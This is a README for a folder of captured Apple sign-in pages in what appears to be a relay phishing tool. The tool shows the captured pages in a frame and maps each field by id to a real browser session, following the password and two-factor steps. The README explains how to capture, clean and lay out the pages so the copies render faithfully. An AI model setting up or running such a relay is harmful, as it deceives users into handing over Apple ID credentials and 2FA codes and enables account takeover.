# Captured pages

Put the HTML files you captured in this folder, starting with `1.html`. Once the
browser has the sign-in form on screen, the app shows `1.html` in a frame; every
page here is reachable at `/src/<name>.html`.

What the server does with a captured page: **nothing.** It is served byte for
byte.

- No script is added. Nothing runs inside the capture — the mapping lives in the
  app page and in the server.
- No meta is rewritten, no policy is edited, no comment is removed.
- The file on disk is never written to, and there is no write path for this
  folder at all.

**Images, stylesheets and fonts are served too**, at the relative paths the page
already uses, so keep them next to it. `1_files/apple.png` in the capture is
`/src/1_files/apple.png` here, which is the same relative URL — nothing has to
be adjusted.

## How the mapping finds the fields

The capture kept the ids of the page it was taken from, so a field maps to the
element with the same id in the real page: `#account_name_text_field` in the
capture is `#account_name_text_field` in the browser window, and `#sign-in` is
the real Continue. Keep those ids as they were captured and the mapping works;
rename one and that field stops mapping.

A SingleFile export keeps the sign-in form inside `<iframe srcdoc="…">`. That is
fine: the app binds the frames inside the page as well as the page itself, and
the server looks in every frame of the real browser.

## Capturing a file that renders

Two things tend to go wrong, and both are fixed at capture time.

**Assets.** A page saved with **"Webpage, HTML only"** is one file and nothing
else: its CSS, fonts and images were never downloaded, so it shows up unstyled
with broken spacing. Save with **"Webpage, Complete"** (or SingleFile) instead
and the stylesheet and images come with it — put them beside the HTML and the
relative URLs line up.

**Scripts that re-run.** A snapshot of a live page keeps the scripts that built
it, and when the snapshot is served those scripts run a second time against a
copy with no Apple backend behind it, which can clear a form that is in the file.
Fix that at capture time:

1. Load the page in Chrome and let it finish rendering.
2. DevTools → Console, on that page:

   ```js
   document.querySelectorAll("script").forEach((s) => s.remove());
   ```

3. Elements → right-click `<html>` → **Copy → Copy outerHTML**, paste it into
   `1.html` under `<!DOCTYPE html>`.
4. Copy in the `_files` folder from a "Webpage, Complete" save.

Leaving the capture's own policy meta (`Content-Security-Policy`) in place is
fine: nothing needs to load inside the capture any more, and a policy only ever
applies to the capture's own scripts.

`/src/` (no file name) lists what is here, and a missing page says so instead of
showing a bare 404, so a fresh clone with an empty `src/` still explains itself.

## One capture per step

The app shows `1.html`. When the real page in the browser moves on — password,
then the two-factor step — the frame has to move on as well: that is what
`2.html`, `3.html` and so on are for. Put them here with the ids of the step
they mirror, and the mapping keeps working without being told anything.
